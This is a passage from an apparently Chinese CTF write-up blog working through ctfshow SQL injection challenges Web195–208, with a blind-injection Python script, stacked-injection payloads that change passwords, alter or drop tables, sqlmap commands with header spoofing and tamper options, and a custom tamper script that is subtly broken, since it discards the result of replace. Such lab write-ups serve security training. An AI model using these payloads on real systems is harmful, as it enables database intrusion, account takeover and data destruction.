id,f1ag,id,username,pass</span></span><br><span class="line"><span class="comment"># payload = &quot;0&#x27; or if(mid((select group_concat(column_name) from information_schema.columns where table_schema=database()),&#123;&#125;,1)&gt;&#x27;&#123;&#125;&#x27;,1,0) -- &quot;</span></span><br><span class="line"><span class="comment"># flag</span></span><br><span class="line">payload = <span class="string">&quot;0&#x27; or if(mid((select f1ag from ctfshow_flxg),&#123;&#125;,1)&gt;&#x27;&#123;&#125;&#x27;,1,0) -- &quot;</span></span><br><span class="line">true_flag = <span class="string">&quot;\\u5bc6\\u7801\\u9519\\u8bef&quot;</span></span><br><span class="line">result = <span class="string">&quot;&quot;</span></span><br><span class="line">index = <span class="number">1</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    start = <span class="number">32</span></span><br><span class="line">    end = <span class="number">127</span></span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">not</span> (<span class="built_in">abs</span>(start-end) == <span class="number">1</span> <span class="keyword">or</span> start == end): <span class="comment">#abs,取绝对值</span></span><br><span class="line">        p = (start + end) // <span class="number">2</span></span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&quot;username&quot;</span>: payload.<span class="built_in">format</span>(index, <span class="built_in">chr</span>(p)),</span><br><span class="line">            <span class="string">&quot;password&quot;</span>: <span class="number">0</span></span><br><span class="line">        &#125;</span><br><span class="line">        response = <span class="literal">None</span></span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                response = requests.post(url, data=data)</span><br><span class="line">            <span class="keyword">except</span>:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> true_flag <span class="keyword">in</span> response.text:</span><br><span class="line">            start = p</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            end = p</span><br><span class="line"></span><br><span class="line">    result += <span class="built_in">chr</span>(end).lower() <span class="comment"># 部分字母变成了大写 _ 变成了 &#123; 暂时还不知道什么原因 但可以肯定跟没用 ascii() 有关</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[*] result: <span class="subst">&#123;result&#125;</span>&quot;</span>)</span><br><span class="line">    index += <span class="number">1</span></span><br></pre></td></tr></table></figure>

<h2 id="Web195（堆叠注入开始）"><a href="#Web195（堆叠注入开始）" class="headerlink" title="Web195（堆叠注入开始）"></a>Web195（堆叠注入开始）</h2><p>由于是第一题，我将详细写一遍<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1664041477202-6d36a99e-72c3-44f5-8155-7022d7a8bae0.png#averageHue=%23f5f4f4&clientId=ua75a4812-b2b1-4&from=paste&height=686&id=u967a404e&name=image.png&originHeight=857&originWidth=1638&originalType=binary&ratio=1&rotation=0&showTitle=false&size=40711&status=done&style=none&taskId=u60d7e9fe-3643-4bb5-933f-7d3e3b2e778&title=&width=1310.4" alt="image.png"><br>注意这里，查询语句中的username已经没有引号包裹了，取而代之的是在结尾加了个分号，这时候考虑堆叠注入<br>什么是堆叠注入，就是执行多条sql语句：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1664041526112-b334d23e-450b-48b4-83a3-b9b8fd01fe3a.png#averageHue=%2310100f&clientId=ua75a4812-b2b1-4&from=paste&height=243&id=uc35ac786&name=image.png&originHeight=304&originWidth=322&originalType=binary&ratio=1&rotation=0&showTitle=false&size=8103&status=done&style=none&taskId=udbc4928d-a0b5-4c78-8c2b-b6d6b3eba0c&title=&width=257.6" alt="image.png"><br>题目中ban掉了<code>&#39;,&quot;,and,select,union</code>这基本说明不能用sql注入已经盖棺定论了<br>但是唯独没有ban分号；<br>这时候可以使用堆叠注入<br>payload<code>username=1;update(ctshow_user)set</code>pass<code>=1</code><br><code>password=1</code><br>用堆叠注入去改密码，然后登入即可</p>
<ul>
<li>update:</li>
</ul>
<p>更改数据的sql语句：<img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1664041710760-6f8fb6c9-ce4e-48af-8075-26a32e43c794.png#averageHue=%23f8f8f7&clientId=ua75a4812-b2b1-4&from=paste&height=770&id=u299ec070&name=image.png&originHeight=962&originWidth=1104&originalType=binary&ratio=1&rotation=0&showTitle=false&size=86154&status=done&style=none&taskId=uc9bfdc80-1011-470d-8aff-08234832360&title=&width=883.2" alt="image.png"><br>这里虽然不能用空格，但是能用以下两种格式去绕过：<br><code>update(ctshow_user)set</code>pass<code>=1</code><br><code>update</code>ctfshow_user<code>set</code>pass<code>=1</code><br>不能2个都用括号包裹，会报错，已经测试</p>
<ul>
<li>反引号在sql中的意义：</li>
</ul>
<p><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1664041836768-5ad4f05c-592e-421f-8777-ee63f32a50a0.png#averageHue=%23faf9f8&clientId=ua75a4812-b2b1-4&from=paste&height=618&id=u3daae301&name=image.png&originHeight=772&originWidth=1265&originalType=binary&ratio=1&rotation=0&showTitle=false&size=134345&status=done&style=none&taskId=u0e93c9ae-1fed-43f9-9ef7-8b1ca67e001&title=&width=1012" alt="image.png"><br>就是区别特殊字符串的用法，相当于python中单引号括起来的就强调这是字符串</p>
<p>最后直接输入username&#x3D;0,password&#x3D;1<br>为什么输入username&#x3D;admin不行呢？因为查询语句中username没有被引号包裹起来，单纯输入admin进去是不会被识别成字符串的，所以用0来代替，具体原因在上面讲过</p>
<p>除此之外，还可以输入16进制字符串：username&#x3D;<code>0x61646d696e</code><br>也就是admin的十六进制形式：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1664042061148-2616bbf8-04db-488b-b850-d0c654af3001.png#averageHue=%23e6e9c3&clientId=ua75a4812-b2b1-4&from=paste&height=282&id=u9b09f922&name=image.png&originHeight=352&originWidth=456&originalType=binary&ratio=1&rotation=0&showTitle=false&size=14802&status=done&style=none&taskId=ue5ce3142-3073-49b4-8d5f-949645f8e8f&title=&width=364.8" alt="image.png"><br>mysql可以识别十六进制字符串，再转化为字符串：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1664042106175-e51a5ed5-4473-4ddf-ba7b-18eb3b7912c8.png#averageHue=%2311100f&clientId=ua75a4812-b2b1-4&from=paste&height=100&id=u1532ad4c&name=image.png&originHeight=125&originWidth=249&originalType=binary&ratio=1&rotation=0&showTitle=false&size=4753&status=done&style=none&taskId=ub3d626cc-d8bc-46d5-a70a-36368ff2eb2&title=&width=199.2" alt="image.png"></p>
<h2 id="Web196-常规）"><a href="#Web196-常规）" class="headerlink" title="Web196(常规）"></a>Web196(常规）</h2><p><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1664112853996-449ae791-6044-4b48-a928-bd7d418c7ab0.png#averageHue=%23f2f1f1&clientId=u0c6747f9-1817-4&from=paste&height=338&id=ue3a5b273&name=image.png&originHeight=422&originWidth=1551&originalType=binary&ratio=1&rotation=0&showTitle=false&size=23823&status=done&style=none&taskId=u10a768ee-d908-4dfb-90c6-8e4bb1595a4&title=&width=1240.8" alt="image.png"><br>嘴巴上说了ban了select，实际上还是可以用<br>payload：username&#x3D;<code>1;select(1)</code>,password&#x3D;1<br>这里为什么密码是1呢，仔细看判断语句，是<code>$row[0]==$password</code>，只要查询结果的第一行等于我们输入的password即可，堆叠注入后后面一个语句会成为查询结果取而代之就是1了</p>
<h2 id="Web197-alter，drop，create）"><a href="#Web197-alter，drop，create）" class="headerlink" title="Web197(alter，drop，create）"></a>Web197(alter，drop，create）</h2><p>解法挺多的<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1664116428785-f8f32915-c676-4d1b-86bd-173dd4845c43.png#averageHue=%23f5f5f4&clientId=u0c6747f9-1817-4&from=paste&height=449&id=ucea85591&name=image.png&originHeight=561&originWidth=1621&originalType=binary&ratio=1&rotation=0&showTitle=false&size=24518&status=done&style=none&taskId=ub7d57b4b-62b6-4e5b-939a-6213840912b&title=&width=1296.8" alt="image.png"><br>这次是真ban了select，我们就用alter把pass和id的名字互换，然后通过爆破得到结果</p>
<ul>
<li>alter:</li>
</ul>
<p><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1664116472884-13ac78a8-b314-48ec-806f-9514f0d1d78c.png#averageHue=%23f7f7f6&clientId=u0c6747f9-1817-4&from=paste&height=352&id=uddc364bf&name=image.png&originHeight=440&originWidth=1253&originalType=binary&ratio=1&rotation=0&showTitle=false&size=42463&status=done&style=none&taskId=ucbd0e9fb-2868-4ef0-b56e-498f4ec6b4c&title=&width=1002.4" alt="image.png"><br>payload:<code>0;alter table ctfshow_user change pass k1he varchar(255); alter table ctfshow_user change id pass varchar(255)</code><br><strong>这里一定要指定类型啊，这是必要参数</strong><br>然后burpsuite抓包，爆破：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1664116497657-f8f61b7f-1600-459a-ac38-958164c305f0.png#averageHue=%23f7f7f6&clientId=u0c6747f9-1817-4&from=paste&height=418&id=u77e205ad&name=image.png&originHeight=523&originWidth=1278&originalType=binary&ratio=1&rotation=0&showTitle=false&size=68855&status=done&style=none&taskId=u94a53cba-f6d6-4350-b660-8cc45ea80b1&title=&width=1022.4" alt="image.png"><br>用户名是admin	的十六进制字符串，开始爆破：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1664116514805-a9f461ec-6a02-4012-88c5-1ad05aad6984.png#averageHue=%23f8f7f5&clientId=u0c6747f9-1817-4&from=paste&height=532&id=uca018aa2&name=image.png&originHeight=665&originWidth=876&originalType=binary&ratio=1&rotation=0&showTitle=false&size=60651&status=done&style=none&taskId=u1cdc7828-e6fd-4b60-9be6-976fc669537&title=&width=700.8" alt="image.png"></p>
<p>Payload2：<br>通过删除数据库，再新建数据库来达到目的<br><code>1;drop table ctfshow_user;create table ctfshow_user(username varchar(255),pass varchar(255));insert ctfshow_user(username,pass) value(1,2)</code><br>这里insert插入数据也可以这么写，一般是insert table into values，也可以像上面一样的写<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1664118395085-d8c71ab8-2b7a-4be1-959a-30881a16b1b0.png#averageHue=%23191715&clientId=u0c6747f9-1817-4&from=paste&height=69&id=ufb39076f&name=image.png&originHeight=86&originWidth=519&originalType=binary&ratio=1&rotation=0&showTitle=false&size=8645&status=done&style=none&taskId=uc06e383d-b01e-4da1-b43d-2953a21154d&title=&width=415.2" alt="image.png"><br>之后直接用户名输入1，密码输入2<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1664117022178-7bcc1566-7ffc-407a-96ca-d7b699ac79db.png#averageHue=%23f1f1f1&clientId=u0c6747f9-1817-4&from=paste&height=541&id=u61c9601f&name=image.png&originHeight=676&originWidth=1220&originalType=binary&ratio=1&rotation=0&showTitle=false&size=34583&status=done&style=none&taskId=u36642184-61c1-4230-8145-8094046d126&title=&width=976" alt="image.png"></p>
<h2 id="Web198（alter）"><a href="#Web198（alter）" class="headerlink" title="Web198（alter）"></a>Web198（alter）</h2><p>用上述payload1即可</p>
<h2 id="Web199（常规，数据类型）"><a href="#Web199（常规，数据类型）" class="headerlink" title="Web199（常规，数据类型）"></a>Web199（常规，数据类型）</h2><p><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1664118021385-4109ff00-11e0-4ec4-ba9a-38a6aeabb640.png#averageHue=%23f8f7f7&clientId=u0c6747f9-1817-4&from=paste&height=659&id=u9a29a4da&name=image.png&originHeight=824&originWidth=1624&originalType=binary&ratio=1&rotation=0&showTitle=false&size=35376&status=done&style=none&taskId=u01b3b4ff-f6f2-4c06-af34-4f46d67297b&title=&width=1299.2" alt="image.png"><br>ban了括号，没了括号就不能指定类型varchar了，varchar（长度），要这样子使用<br>payload：<code>1;show tables</code></p>
<ul>
<li>show tables:显示当前数据库所有表</li>
</ul>
<p>然后由于第一行就是ctfshow_user<br>password直接输入ctfshow_user即可，和web196有些许类似</p>
<p>payload2：<br><code>0;alter table ctfshow_user change pass k1he text;alter table ctfshow_user change id pass int</code><br>我为什么没想到还有text数据类型，然后id改为int即可<br>之后username&#x3D;admin的十六进制，爆破password即可</p>
<h2 id="Web200（堆叠结束）"><a href="#Web200（堆叠结束）" class="headerlink" title="Web200（堆叠结束）"></a>Web200（堆叠结束）</h2><p>上述2个方法均可</p>
<h2 id="Web201（sqlmap开始）"><a href="#Web201（sqlmap开始）" class="headerlink" title="Web201（sqlmap开始）"></a>Web201（sqlmap开始）</h2><p><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1664119741036-a376b810-44b8-4dc6-923b-035f0aeae123.png#averageHue=%23f7f7f7&clientId=u0c6747f9-1817-4&from=paste&height=713&id=u89d42f58&name=image.png&originHeight=891&originWidth=1733&originalType=binary&ratio=1&rotation=0&showTitle=false&size=49282&status=done&style=none&taskId=ucb8c4154-a550-47e6-bd33-b1af8e4f9d6&title=&width=1386.4" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1664119768138-b2dbd6fd-1215-4e45-959e-f7b8635170be.png#averageHue=%23f7f7f7&clientId=u0c6747f9-1817-4&from=paste&height=476&id=u66c63c74&name=image.png&originHeight=595&originWidth=1644&originalType=binary&ratio=1&rotation=0&showTitle=false&size=28466&status=done&style=none&taskId=uc762787e-0ba8-4e29-a9c0-0f4371b61b3&title=&width=1315.2" alt="image.png"><br>前端已经显示不出东西了，这时候得用sqlmap去试试<br><code>python sqlmap.py -u &quot;[http://d9e69483-f882-4f05-abfa-70db01f64a3d.challenge.ctf.show/api/?id=1&quot;](http://d9e69483-f882-4f05-abfa-70db01f64a3d.challenge.ctf.show/api/?id=1&quot;) --user-agent=sqlmap --referer=ctf.show --dbs</code><br>这一条指令可以指定useragent和referer的值，来达到绕过，–dbs表示爆出数据库，经过在&#x2F;api界面的测试，useragent和referer都有判断，referer要包含ctf.show，然后user-agent要有sqlmap<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1664120234308-d4be322e-97ca-455c-b438-3f0a7bade18b.png#averageHue=%23fbfbdc&clientId=u0c6747f9-1817-4&from=paste&height=58&id=uf21dbba9&name=image.png&originHeight=73&originWidth=1062&originalType=binary&ratio=1&rotation=0&showTitle=false&size=12931&status=done&style=none&taskId=ua80578e3-13c3-4fe8-b021-b89fdd0067e&title=&width=849.6" alt="image.png"><br>“不用sqlmap是没有灵魂的”<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1664120267499-5a926295-f024-4186-b57b-01fee1693a2f.png#averageHue=%238c8c8c&clientId=u0c6747f9-1817-4&from=paste&height=722&id=u00a6a688&name=image.png&originHeight=903&originWidth=1917&originalType=binary&ratio=1&rotation=0&showTitle=false&size=55497&status=done&style=none&taskId=u7ef85a50-9a6a-4fca-92fa-fb83380b8d8&title=&width=1533.6" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1664120290213-a0eb2aae-d946-477d-a918-6978406c3add.png#averageHue=%23e3bf87&clientId=u0c6747f9-1817-4&from=paste&height=190&id=uad08fb31&name=image.png&originHeight=237&originWidth=748&originalType=binary&ratio=1&rotation=0&showTitle=false&size=17010&status=done&style=none&taskId=ud875654a-25a5-49eb-b6ba-b9565780098&title=&width=598.4" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1664119842900-c2c4fa98-c326-46e0-b841-a4338a74b4cf.png#averageHue=%231a1918&clientId=u0c6747f9-1817-4&from=paste&height=134&id=u3dfa9c0c&name=image.png&originHeight=167&originWidth=611&originalType=binary&ratio=1&rotation=0&showTitle=false&size=15043&status=done&style=none&taskId=u3c5e78a5-640a-46d3-ac81-5c275b571f7&title=&width=488.8" alt="image.png"><br>数据库出来了啊，然后我们就查询库里的表：<br><code>python sqlmap.py -u &quot;[http://d9e69483-f882-4f05-abfa-70db01f64a3d.challenge.ctf.show/api/?id=1&quot;](http://d9e69483-f882-4f05-abfa-70db01f64a3d.challenge.ctf.show/api/?id=1&quot;) --user-agent=sqlmap --referer=ctf.show -D &quot;ctfshow_web&quot; --tables</code><br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1664120126197-267a9a02-5c9c-4397-84ef-585d5214c417.png#averageHue=%23181615&clientId=u0c6747f9-1817-4&from=paste&height=144&id=uf3c59177&name=image.png&originHeight=180&originWidth=764&originalType=binary&ratio=1&rotation=0&showTitle=false&size=22272&status=done&style=none&taskId=uf7232a07-9142-41c6-9574-b30012e05e7&title=&width=611.2" alt="image.png"><br>最后暴字段：<br><code>python sqlmap.py -u &quot;[http://d9e69483-f882-4f05-abfa-70db01f64a3d.challenge.ctf.show/api/?id=1&quot;](http://d9e69483-f882-4f05-abfa-70db01f64a3d.challenge.ctf.show/api/?id=1&quot;) --user-agent=sqlmap --referer=ctf.show -D &quot;ctfshow_web&quot; -T &quot;ctfshow_user&quot; --columns</code><br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1664120315789-ac11a808-7601-4808-8afb-85995bcc89be.png#averageHue=%23242221&clientId=u0c6747f9-1817-4&from=paste&height=189&id=u585ad56d&name=image.png&originHeight=236&originWidth=523&originalType=binary&ratio=1&rotation=0&showTitle=false&size=17681&status=done&style=none&taskId=uf9830f3a-f724-43aa-b4df-19a9d6f4f65&title=&width=418.4" alt="image.png"><br>最后得到数据：<br><code>python sqlmap.py -u &quot;[http://d9e69483-f882-4f05-abfa-70db01f64a3d.challenge.ctf.show/api/?id=1&quot;](http://d9e69483-f882-4f05-abfa-70db01f64a3d.challenge.ctf.show/api/?id=1&quot;) --user-agent=sqlmap --referer=ctf.show -D &quot;ctfshow_web&quot; -T &quot;ctfshow_user&quot; --dump</code><br>这是爆出当前表所有字段的数据，假如想爆出指定的话那就<br><code>-D &quot;ctfshow_web&quot; -T &quot;ctfshow_user&quot; -C &quot;字段&quot; --dump</code><br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1664120656393-8203ef15-7e42-44ba-954a-e520f6c9cdc1.png#averageHue=%23100f0e&clientId=u0c6747f9-1817-4&from=paste&height=394&id=u8550d814&name=image.png&originHeight=492&originWidth=635&originalType=binary&ratio=1&rotation=0&showTitle=false&size=35838&status=done&style=none&taskId=u66de80c3-bdaf-4285-ac07-48bfb7d60de&title=&width=508" alt="image.png"></p>
<h2 id="Web202-–data改请求方式）"><a href="#Web202-–data改请求方式）" class="headerlink" title="Web202(–data改请求方式）"></a>Web202(–data改请求方式）</h2><p><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1664121372988-91a7d586-c383-45f4-9196-97d9d46aac6c.png#averageHue=%23fcfcfc&clientId=u0c6747f9-1817-4&from=paste&height=573&id=u16c8dd9c&name=image.png&originHeight=716&originWidth=1580&originalType=binary&ratio=1&rotation=0&showTitle=false&size=38582&status=done&style=none&taskId=u9eef2fa5-885a-48c0-a293-e1732c588f3&title=&width=1264" alt="image.png"><br>不管你输入什么他都是返回你所有的数据，然后抓包：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1664121391116-4e8bd9f2-8b7a-437c-a741-3e6168b41f64.png#averageHue=%23f8f7f7&clientId=u0c6747f9-1817-4&from=paste&height=251&id=ua3fe2941&name=image.png&originHeight=314&originWidth=1275&originalType=binary&ratio=1&rotation=0&showTitle=false&size=33449&status=done&style=none&taskId=u6a3d438b-9319-4e0f-94a7-4b53ba95a53&title=&width=1020" alt="image.png"><br>改了一下请求方式，并且改了ua和referer发现出现了不同的结果<br>salmap上号：<br><code>python sqlmap.py -u [http://e1faa3a4-5f2e-4751-8f15-98be4258af9f.challenge.ctf.show/api/](http://e1faa3a4-5f2e-4751-8f15-98be4258af9f.challenge.ctf.show/api/) --data &quot;id=1&quot; --user-agent=sqlmap --referer=ctf.show --dbs</code><br><code>-- data</code>：以post方式去传递参数<br>next：<br><code>python sqlmap.py -u [http://e1faa3a4-5f2e-4751-8f15-98be4258af9f.challenge.ctf.show/api/](http://e1faa3a4-5f2e-4751-8f15-98be4258af9f.challenge.ctf.show/api/) --data &quot;id=1&quot; --user-agent=sqlmap --referer=ctf.show -D ctfshow_web --tables</code><br>之后就爆库就行:<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1664121516855-47481284-9c37-42e6-b429-9a6230a192f6.png#averageHue=%2331302f&clientId=u0c6747f9-1817-4&from=paste&height=416&id=u83a7c35b&name=image.png&originHeight=520&originWidth=955&originalType=binary&ratio=1&rotation=0&showTitle=false&size=54010&status=done&style=none&taskId=u4fdf4473-3017-4550-ab18-10781e29038&title=&width=764" alt="image.png"></p>
<h2 id=""><a href="#" class="headerlink" title=""></a></h2><p>Web203（–method）<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1664165665889-7c75d23e-ea89-4b98-bb0a-acc33ef2ab23.png#averageHue=%23f6f6f5&clientId=uc187d69c-ffd4-4&from=paste&height=540&id=u544f8236&name=image.png&originHeight=675&originWidth=1674&originalType=binary&ratio=1&rotation=0&showTitle=false&size=32960&status=done&style=none&taskId=u60dcb549-f599-4243-85d7-105d67b4b49&title=&width=1339.2" alt="image.png"><br>本题需要用–method去修改请求模式，经过测试需要PUT提交<br><code>python .\sqlmap.py [http://8f90510a-3286-4a8f-80da-467a621a5d71.challenge.ctf.show/api/index.php](http://8f90510a-3286-4a8f-80da-467a621a5d71.challenge.ctf.show/api/index.php) --data &quot;id=1&quot; --user-agent=sqlmap --referer=ctf.show --method=PUT --headers=&quot;Content-Type:text/plain&quot;</code><br>用put方式提交的话，要用”Content-Type:text&#x2F;plain”，否则put接受不到提交的表单<br>最后就是一步步的嗦</p>
<h2 id="Web204（–cookie）"><a href="#Web204（–cookie）" class="headerlink" title="Web204（–cookie）"></a>Web204（–cookie）</h2><p><code> python .\sqlmap.py [http://13d42cff-f75e-4d63-82b6-e071e956dfce.challenge.ctf.show/api/index.php](http://13d42cff-f75e-4d63-82b6-e071e956dfce.challenge.ctf.show/api/index.php) --data &quot;id=1&quot; --user-agent=sqlmap --referer=ctf.show --method=PUT --headers=&quot;Content-Type:text/plain&quot; --cookie=&quot;PHPSESSID=8ob7ousv6ls8c04t166amj23ou;ctfshow=2d06e5c71814a2377eaf967b222971fd&quot; -D ctfshow_web --dump</code><br>就多追加了一个cookie</p>
<h2 id="Web205（鉴权）"><a href="#Web205（鉴权）" class="headerlink" title="Web205（鉴权）"></a>Web205（鉴权）</h2><p>通过抓包分析发现：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1664166965090-6b6504bf-7eee-4469-ba9e-1a10dc91c9c4.png#averageHue=%23f7f7f6&clientId=uc187d69c-ffd4-4&from=paste&height=166&id=ucae00360&name=image.png&originHeight=208&originWidth=1097&originalType=binary&ratio=1&rotation=0&showTitle=false&size=24542&status=done&style=none&taskId=uf9d540b5-5d0e-4613-b2d9-e475ffb107f&title=&width=877.6" alt="image.png"><br>访问&#x2F;api之前会访问&#x2F;api&#x2F;gettoken.php这一网址，说明存在鉴权<br>sqlmap：<br><code> python .\sqlmap.py [http://e8ca2bfa-09e7-4477-ba64-f6fc01a336f1.challenge.ctf.show/api/index.php](http://e8ca2bfa-09e7-4477-ba64-f6fc01a336f1.challenge.ctf.show/api/index.php) --data &quot;id=1&quot; --user-agent=sqlmap --referer=ctf.show --method=PUT --headers=&quot;Content-Type:text/plain&quot; --safe-url=&quot;[http://e8ca2bfa-09e7-4477-ba64-f6fc01a336f1.challenge.ctf.show/api/getToken.php&quot;](http://e8ca2bfa-09e7-4477-ba64-f6fc01a336f1.challenge.ctf.show/api/getToken.php&quot;) --safe-freq=1</code></p>
<p>–safe-url:意思是访问目标网址前需要访问的地址，–safe-freq是每两次间访问gettoken的次数，设置为一次就够了，随后就直接dump就够了</p>
<h2 id="Web206（闭合）"><a href="#Web206（闭合）" class="headerlink" title="Web206（闭合）"></a>Web206（闭合）</h2><p><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1664167822328-5eba7843-c4ed-4842-b6a4-0120ab0686e0.png#averageHue=%23f6f6f5&clientId=uc187d69c-ffd4-4&from=paste&height=354&id=u93750655&name=image.png&originHeight=443&originWidth=1748&originalType=binary&ratio=1&rotation=0&showTitle=false&size=20770&status=done&style=none&taskId=u2711c0c4-3da5-4e71-b871-9b9c12ad9cd&title=&width=1398.4" alt="image.png"><br>说是考查闭合，可是sqlmap会自己识别闭合呀</p>
<p><code>python .\sqlmap.py -u [http://14446647-1d47-4f41-92da-b93789ccad33.challenge.ctf.show/api/index.php](http://14446647-1d47-4f41-92da-b93789ccad33.challenge.ctf.show/api/index.php) --data &quot;id=1&quot; --user-agent=sqlmap --referer=ctf.show --method=PUT --headers=&quot;Content-Type:text/plain&quot; --safe-url=&quot;[http://14446647-1d47-4f41-92da-b93789ccad33.challenge.ctf.show/api/getToken.php&quot;](http://14446647-1d47-4f41-92da-b93789ccad33.challenge.ctf.show/api/getToken.php&quot;) --safe-freq=1</code><br>这里也可以手动闭合<br>–suffix:指定payload后面加的后缀<br>suffix可以添加多个<br><code>--suffix=&quot;&#39;)#&quot;</code></p>
<h2 id="Web207-tamper绕过空格）"><a href="#Web207-tamper绕过空格）" class="headerlink" title="Web207(tamper绕过空格）"></a>Web207(tamper绕过空格）</h2><p><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1664168179968-6cca191f-6cc8-4505-af95-ccbfd06a2ace.png#averageHue=%23f5f5f5&clientId=uc187d69c-ffd4-4&from=paste&height=505&id=ubcff7374&name=image.png&originHeight=631&originWidth=1607&originalType=binary&ratio=1&rotation=0&showTitle=false&size=29293&status=done&style=none&taskId=u5d223564-1dc7-4d3e-b62b-9885dc65f97&title=&width=1285.6" alt="image.png"><br>在上一题的基础上增加了对空格的过滤<br><code> python .\sqlmap.py -u [http://c0c1dcf0-a8bb-4798-bafb-194bda564bfe.challenge.ctf.show/api/index.php](http://c0c1dcf0-a8bb-4798-bafb-194bda564bfe.challenge.ctf.show/api/index.php) --data &quot;id=1&quot; --user-agent=sqlmap --referer=ctf.show --method=PUT --headers=&quot;Content-Type:text/plain&quot; --safe-url=&quot;[http://c0c1dcf0-a8bb-4798-bafb-194bda564bfe.challenge.ctf.show/api/getToken.php&quot;](http://c0c1dcf0-a8bb-4798-bafb-194bda564bfe.challenge.ctf.show/api/getToken.php&quot;) --safe-freq=1  --tamper=space2comment</code><br>用–tamper参数去绕过<br>space2comment是一种模式，表示空格被ban</p>
<h2 id="Web208（双写）"><a href="#Web208（双写）" class="headerlink" title="Web208（双写）"></a>Web208（双写）</h2><p><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1664171030867-0c8952d7-cc8a-42b5-81b5-553b2501f543.png#averageHue=%23f6f6f6&clientId=uc187d69c-ffd4-4&from=paste&height=594&id=u06e1fe69&name=image.png&originHeight=742&originWidth=1764&originalType=binary&ratio=1&rotation=0&showTitle=false&size=34664&status=done&style=none&taskId=u038d0089-f2a9-417c-b694-af57b08fb3d&title=&width=1411.2" alt="image.png"><br>空格和select都被ban了，但是select可以双写绕过<br>我们要自己写个tamper脚本，其实不难，就是在原来的脚本改动一下</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#author：BOOGIPOP</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> lib.core.compat <span class="keyword">import</span> xrange</span><br><span class="line"><span class="keyword">from</span> lib.core.enums <span class="keyword">import</span> PRIORITY</span><br><span class="line"></span><br><span class="line">__priority__ = PRIORITY.LOW</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dependencies</span>():</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">tamper</span>(<span class="params">payload, **kwargs</span>):</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    retVal = payload</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> payload:</span><br><span class="line">        retVal.replace(<span class="string">&quot;SELECT&quot;</span>,<span class="string">&#x27;selselectect&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> retVal</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><code> python .\sqlmap.py -u [http://9ba976d8-a8a7-4771-a55f-c4f8966ced50.challenge.ctf.show/api/index.php](http://9ba976d8-a8a7-4771-a55f-c4f8966ced50.challenge.ctf.show/api/index.php) --data &quot;id=1&quot; --user-agent=sqlmap --referer=ctf.show --method=PUT --headers=&quot;Content-Type:text/plain&quot; --safe-url=&quot;[http://9ba976d8-a8a7-4771-a55f-c4f8966ced50.challenge.ctf.show/api/getToken.php&quot;](http://9ba976d8-a8a7-4771-a55f-c4f8966ced50.challenge.ctf.show/api/getToken.php&quot;) --safe-freq=1 --tamper=space2comment,doubleselect</code><br>这样就行了</p>
